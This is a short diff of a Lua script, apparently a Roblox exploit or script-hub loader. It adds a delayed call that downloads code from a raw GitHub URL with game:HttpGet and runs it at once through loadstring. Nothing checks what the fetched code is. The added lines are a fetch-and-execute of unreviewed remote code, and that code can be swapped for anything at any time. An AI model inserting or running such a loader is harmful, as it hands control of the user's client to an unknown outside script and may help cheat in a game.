@@ -152,4 +152,7 @@ task.spawn(function()
     if not ok then
         warn("loader end loi:", err)
     end
+end) 
+task.delay(1,function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/chienminh21/aaaaaaaa/refs/heads/main/helpdevhuhu.lua"))()
 end)
